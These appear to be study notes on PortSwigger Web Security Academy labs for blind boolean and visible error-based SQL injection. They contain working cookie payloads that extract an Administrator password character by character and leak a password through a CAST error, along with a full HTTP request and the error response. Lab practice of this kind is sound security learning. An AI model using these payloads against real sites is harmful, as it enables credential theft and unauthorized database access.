
## Boolean - Internal server error

Tracking id is used to kepp track of a users activity on the website

In the request
`Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4`

In the background
`SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'`

A way to try and get a boolean result here is to edit the TrackingId value, for example by adding to it.

Success: When a TrackingId that was sent to us from the server (by not sending an id cookie we get a new one) we get a Welcome back message on the page (in the html). We don't get this message when we modify the TrackingId cookie.

**We can use this as a boolean test.**

We tried again by adding `…xyz' AND '1'='1` versus `…xyz' AND '1'='2`. Giving:
`SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4' AND '1'='1'`
`SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4' AND '1'='2'`

This also worked as expected. When adding `and true` to the end it is still true while when adding `and false` it's false.

We can do tests for the password of the user Administrator like this:
`xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm`
`xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't`
`xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's`

Using < and > might be useful for manual tests, but we can also make a simple python script

![[Scripts/find_password_boolean copy.py]]


## Using conversion errors to get output

`Cookie: TrackingId='||CAST((SELECT password FROM users limit 1) AS int) --; session=8U6gCmtdwVmleBFAYhXe7mZwKiMkyUkh`

We had to remove the full tracking id to get enough chars or we got
```
Unterminated string literal started at position 95 in SQL SELECT * FROM tracking WHERE id = 'mb9Nky8IkRLT'||CAST((SELECT password FROM users limit 1) AS '. Expected  char
```


```http
GET /login HTTP/2
Host: 0abd0062031487c8806f530500b60093.web-security-academy.net
Cookie: TrackingId='||CAST((SELECT password FROM users limit 1) AS int) --; session=8U6gCmtdwVmleBFAYhXe7mZwKiMkyUkh
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0abd0062031487c8806f530500b60093.web-security-academy.net/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Dnt: 1
Sec-Gpc: 1
Te: trailers


```


```http
HTTP/2 500 Internal Server Error
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 2413

<!DOCTYPE html>
<html>
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labs.css rel=stylesheet>
        <title>Visible error-based SQL injection</title>
    </head>
        <script src="/resources/labheader/js/labHeader.js"></script>
        <div id="academyLabHeader">
            <section class='academyLabBanner'>
                <div class=container>
                    <div class=logo></div>
                        <div class=title-container>
                            <h2>Visible error-based SQL injection</h2>
                            <a id='lab-link' class='button' href='/'>Back to lab home</a>
                            <a class=link-back href='https://portswigger.net/web-security/sql-injection/blind/lab-sql-injection-visible-error-based'>
                                Back&nbsp;to&nbsp;lab&nbsp;description&nbsp;
                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                    <g>
                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                    </g>
                                </svg>
                            </a>
                        </div>
                        <div class='widgetcontainer-lab-status is-notsolved'>
                            <span>LAB</span>
                            <p>Not solved</p>
                            <span class=lab-status-icon></span>
                        </div>
                    </div>
                </div>
            </section>
        </div>
        <div theme="">
            <section class="maincontainer">
                <div class="container is-page">
                    <header class="navigation-header">
                    </header>
                    <h4>ERROR: invalid input syntax for type integer: "yyy7kbdqpr1cl9mvcl8b"</h4>
                    <p class=is-warning>ERROR: invalid input syntax for type integer: "yyy7kbdqpr1cl9mvcl8b"</p>
                </div>
            </section>
        </div>
    </body>
</html>

```